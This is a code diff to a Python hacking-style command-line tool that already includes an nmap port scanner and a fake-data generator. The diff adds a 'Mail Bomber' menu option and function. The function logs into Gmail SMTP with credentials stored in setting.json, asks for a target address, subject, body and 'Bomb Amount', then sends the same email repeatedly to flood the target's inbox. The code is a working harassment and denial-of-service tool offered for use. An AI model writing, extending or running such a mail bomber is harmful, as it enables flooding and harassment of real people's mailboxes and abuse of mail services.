@@ -1,7 +1,10 @@
 import nmap, datetime, getpass
 import sys, time, decimal, re
+import smtplib
 from clear_screen import clear
 from faker import Faker
+from email.mime.multipart import MIMEMultipart
+from email.mime.text import MIMEText
 
 nmap_sc = nmap.PortScanner()
 curuser = getpass.getuser()
@@ -63,6 +66,10 @@ def sw_case_menu(key):
 	elif re.search('4', key):
 		print('________________________________________________________________________\n')
 		data_gen_proc(key)
+		print('________________________________________________________________________\n')
+	elif key == '5':
+		print('________________________________________________________________________\n')
+		mail_bomber_proc()
 		print('________________________________________________________________________\n')
 
 ## Port Scanner
@@ -398,6 +405,65 @@ def fake_job():
 
 	frmt_query = '{:.3f}'.format(time.time() - go_time)
 	print('\nQuery finished successfully in %s seconds ...' % (frmt_query))
+
+## Mail Bomber
+def mail_bomber_proc():
+	open_json = open("setting.json","r")
+	str_json  = open_json.read()
+	arr_json  = re.split('; |, |\\n', str_json)
+	get_gmailaddr = re.split('; |, |\"', str(arr_json[0]))
+	get_gmailpass = re.split('; |, |\"', str(arr_json[1]))
+
+	sender_address   = get_gmailaddr[1]
+	sender_pass      = get_gmailpass[1]
+	receiver_address   = input('Mail Target\t: ')
+
+	message = MIMEMultipart()
+	message['From'] = sender_address
+	message['To']   = receiver_address
+
+	message['Subject'] = input('Mail Subject\t: ')
+	mail_content       = input('Mail Body\t: ')
+	message.attach(MIMEText(mail_content, 'plain'))
+
+	session = smtplib.SMTP('smtp.gmail.com', 587)
+	session.starttls()
+	session.login(sender_address, sender_pass)
+	text = message.as_string()
+
+	total_mail   = int(input('Bomb Amount\t: '))
+	sub_loop     = int(total_mail/55)
+	interval     = total_mail/55
+	counter      = 1
+
+	print('\n[+] Processing  | ', end="", flush=True)
+	for i in range(54):
+		if sub_loop < 1:
+			for j in range(1):
+				if counter <= total_mail:
+					session.sendmail(sender_address, receiver_address, text)
+					#print('mail sent : %s' % (counter))
+					counter += 1
+					time.sleep(0.3)
+		else:
+			for j in range(sub_loop*2):
+				if counter <= total_mail:
+					session.sendmail(sender_address, receiver_address, text)
+					#print('mail sent : %s' % (counter))
+					counter += 1
+					time.sleep(0.3)
+		prog = ':'
+		print(prog, end="", flush=True)
+		time.sleep(0.1)
+
+	print('\n[+] Finalizing  | ', end="", flush=True)
+	for i in range(54):
+		prog = ':'
+		print(prog, end="", flush=True)
+		time.sleep(0.1)
+	print()
+	session.quit()
+	open_json.close()
 
 ## Main Method
 def main_method():
